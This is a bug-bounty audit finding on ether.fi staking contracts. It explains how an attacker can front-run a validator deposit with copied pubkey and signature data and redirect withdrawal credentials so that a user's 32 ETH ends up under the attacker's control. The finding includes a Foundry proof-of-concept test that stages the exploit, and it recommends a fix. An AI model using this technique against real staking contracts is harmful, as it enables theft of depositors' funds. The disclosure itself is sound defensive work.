# [H] Front-running deposit to change withdrawal credentials will result in `32 ETH` theft

## Summary
Severity: High
Chain: Smart contract
Component: ether-fi
Published: 2023-11-11
Source: https://github.com/hats-finance/ether-fi-0x36c3b77853dec9c4a237a692623293223d4b9bc4/issues/48
Type: hats-finding

## Details
**Github username:** @0xfuje
**Twitter username:** 0xfuje
**Submission hash (on-chain):** 0xff7675bdcb5c7defa3cd4c84b284ca0ac7420af7bad74a92558bd90119397a42
**Severity:** high

**Description:**
## Impact
Attacker will gain `32 ether` deposit from users 

## Description
An attacker can front-run a deposit for it's deposit data and directly deposit 1 ether to the deposit contract, but change the withdrawal credentials. Because the way deposit is implemented on the beacon chain, the withdrawal address remains the initial one upon second deposit, therefore it is permanently changed to the attacker's address who will gain `32 ether` from the honest depositor.

---

### EtherFi - Deposit

There is a two ways to register as a validator in `EtherFi` contracts:
1. A user can call `StakingManager` - `batchRegisterValidators()` to register themselves and deposit `32 ether` to the ETH2 deposit contract
2. A user can call `LiquidityPool` - `batchRegisterAsBnftHolder()` -> `StakingManager` - `batchRegisterValidators()` which will deposit `1 ether` to the ETH2 deposit contract to set the the validator data and wait for the admin to call `batchApproveRegistration()` to send the remaining `31 ether`.

The first method is 100% vulnerable to this attack and the attacker will get `32 ETH` for a `1 ETH` cost attack. For the second way the  `batchApproveRegistration()` comment mentions it's not supposed to be vulnerable to the attack:
> This gets called by the LP and only will only happen when the oracle has confirmed that the withdraw credentials for the validators are correct. This prevents a front-running attack.

However the attacker can still front-run `batchRegisterAsBnftHolder()` and get a 1 ETH deposit for each of the user's validators.

### Consensus Specs - Deposit Contract & Client Implementation

Let's break down how the deposit contract's `deposit()` function works to better understand this attack:

[`consensus-specs/solidity_deposit_contract/deposit_contract.sol`](https://github.com/ethereum/consensus-specs/blob/dev/solidity_deposit_contract/deposit_contract.sol#L101-L159)
```solidity
    function deposit(
        bytes calldata pubkey,
        bytes calldata withdrawal_credentials,
        bytes calldata signature,
        bytes32 deposit_data_root
    ) override external payable {
```

- `pubKey`: Public BLS key to identify validator for Ethereum 2.0
- `withdrawal_credentials`: Public BLS key for an Ethereum address to which all withdrawals will go
- `signature`: Signature used for creating `pubKey`
- `deposit_data_root`: The three above parameters combined in one structure, hash of this will be used for data protection

Let's dive into [Ethereum Consensus Specs](https://github.com/ethereum/consensus-specs/blob/dev/specs/phase0/beacon-chain.md#deposits) to see what exactly will happen after we deposit:

```python
def process_deposit(state: BeaconState, deposit: Deposit) -> None:
    # Verify the Merkle branch
    assert is_valid_merkle_branch(
        leaf=hash_tree_root(deposit.data),
        branch=deposit.proof,
        depth=DEPOSIT_CONTRACT_TREE_DEPTH + 1,  # Add 1 for the List length mix-in
        index=state.eth1_deposit_index,
        root=state.eth1_data.deposit_root,
    )

    # Deposits must be processed in order
    state.eth1_deposit_index += 1

    apply_deposit(
        state=state,
        pubkey=deposit.data.pubkey,
        withdrawal_credentials=deposit.data.withdrawal_credentials,
        amount=deposit.data.amount,
        signature=deposit.data.signature,
    )
```

When a new validator is being added, `process_deposit()` is being called on the client implementation. The function later calls `apply_deposit()` which checks if the public key of a validator is already in the list of existing validators: see `pubkey not in validator_pubkeys`: if it does not yet exist the system will create a new record for that validator. If the `pubkey` already exists we increase the deposit of the current validator. Note that the deposit contract only requires 1 ETH as a minimum deposit.

```python
def apply_deposit(state: BeaconState,
                  pubkey: BLSPubkey,
                  withdrawal_credentials: Bytes32,
                  amount: uint64,
                  signature: BLSSignature) -> None:
    validator_pubkeys = [v.pubkey for v in state.validators]
    if pubkey not in validator_pubkeys:
        # Verify the deposit signature (proof of possession) which is not checked by the deposit contract
        deposit_message = DepositMessage(
            pubkey=pubkey,
            withdrawal_credentials=withdrawal_credentials,
            amount=amount,
        )
        domain = compute_domain(DOMAIN_DEPOSIT)  # Fork-agnostic domain since deposits are valid across forks
        signing_root = compute_signing_root(deposit_message, domain)
        if bls.Verify(pubkey, signing_root, signature):
            add_validator_to_registry(state, pubkey, withdrawal_credentials, amount)
    else:
        # Increase balance by deposit amount
        index = ValidatorIndex(validator_pubkeys.index(pubkey))
        increase_balance(state, index, amount)
```

## Proof of Concept
1. navigate to `test/StakingManager.t.sol`
2. copy the below proof of conept inside the test contract
3. run `forge test --match-test test_DepositFrontRun_0xfuje -vvvv`
```solidity
    function test_DepositFrontRun_0xfuje() public {
        // *** USER SETUP START ***
        vm.prank(0xCd5EBC2dD4Cb3dc52ac66CEEcc72c838B40A5931);
        nodeOperatorManagerInstance.registerNodeOperator(_ipfsHash, 5);

        startHoax(0xCd5EBC2dD4Cb3dc52ac66CEEcc72c838B40A5931);
        uint256[] memory bidId = auctionInstance.createBid{value: 0.1 ether}(
            1,
            0.1 ether
        );

        uint256[] memory bidIdArray = new uint256[](1);
        bidIdArray[0] = bidId[0];
        vm.stopPrank();

        startHoax(0xCd5EBC2dD4Cb3dc52ac66CEEcc72c838B40A5931);
        stakingManagerInstance.batchDepositWithBidIds{value: 32 ether}(
            bidIdArray,
            false
        );

        IStakingManager.DepositData[]
            memory depositDataArray = new IStakingManager.DepositData[](1);

        address etherFiNode = managerInstance.etherfiNodeAddress(1);

        bytes memory userPubKey = hex"8f9c0aab19ee7586d3d470f132842396af606947a0589382483308fdffdaf544078c3be24210677a9c471ce70b3b4c2c";
        bytes memory userSignature = hex"877bee8d83cac8bf46c89ce50215da0b5e370d282bb6c8599aabdbc780c33833687df5e1f5b5c2de8a6cd20b6572c8b0130b1744310a998e1079e3286ff03e18e4f94de8cdebecf3aaac3277b742adb8b0eea074e619c20d13a1dda6cba6e3df";

        bytes32 root = depGen.generateDepositRoot(
            userPubKey,
            userSignature,
            managerInstance.generateWithdrawalCredentials(etherFiNode),
            32 ether
        );
       
        IStakingManager.DepositData memory depositData = IStakingManager
            .DepositData({
                publicKey: userPubKey,
                signature: userSignature,
                depositDataRoot: root,
                ipfsHashForEncryptedValidatorKey: "test_ipfs"
            });

        depositDataArray[0] = depositData;
        vm.stopPrank();
        // *** USER SETUP END ***

        // *** PROOF OF CONCEPT START ***
        address haxor = vm.addr(1337);
        deal(haxor, 1 ether);

        // 2. malicious validator generates their own malicious credentials:
        //  copies the user's pubKey and signature, but changes withdrawal credentials and root
        vm.startPrank(haxor);
        bytes memory attackerWithdrawCred = managerInstance.generateWithdrawalCredentials(haxor);

        bytes32 attackerRoot = depGen.generateDepositRoot(
            userPubKey,
            userSignature,
            attackerWithdrawCred,
            1 ether
        );

        // 3. attacker deposits 1 ether with their forged credentials
        depositContractEth2.deposit{value: 1 ether}(
            userPubKey,
            attackerWithdrawCred,
            userSignature,
            attackerRoot
        );
        vm.stopPrank();

        // 1. user registers as validator and sends 32 ETH to the deposit contract
        vm.startPrank(0xCd5EBC2dD4Cb3dc52ac66CEEcc72c838B40A5931);
        stakingManagerInstance.batchRegisterValidators(_getDepositRoot(), bidId, depositDataArray);

        // 4. attacker will control 33 ETH as a validator
    }
```

## Recommendation
Consider completely removing `StakingManager` - `batchRegisterValidators()` (`b75a60d8`) and only allow the second method for deposits  (deposit 1 ETH -> approve for 31 ETH)  where an oracle confirms that the withdraw credentials for the validators are correct before depositing the remaining 31 ETH. Lido had the same attack vector reported, here's [their discussions for mitigation](https://research.lido.fi/t/mitigations-for-deposit-front-running-vulnerability/1239).
